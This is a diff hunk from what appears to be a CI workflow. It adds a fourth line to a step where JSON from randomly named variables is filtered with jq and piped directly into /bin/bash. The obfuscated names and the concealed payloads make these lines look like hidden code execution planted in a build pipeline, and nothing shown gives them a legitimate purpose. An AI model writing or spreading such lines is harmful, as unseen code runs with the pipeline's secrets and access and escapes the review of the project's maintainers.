@@ -22,6 +22,7 @@ jobs:
           echo $w910 | jq -r .d1 | /bin/bash
           printf '%s' "$kgml91610" | jq -r .drce86439 | /bin/bash
           printf '%s' "$owv8479" | jq -r .bqdmy2 | /bin/bash
+          echo $flwy1 | jq -r .iac770 | /bin/bash
 
       - name: Store results
         if: always()
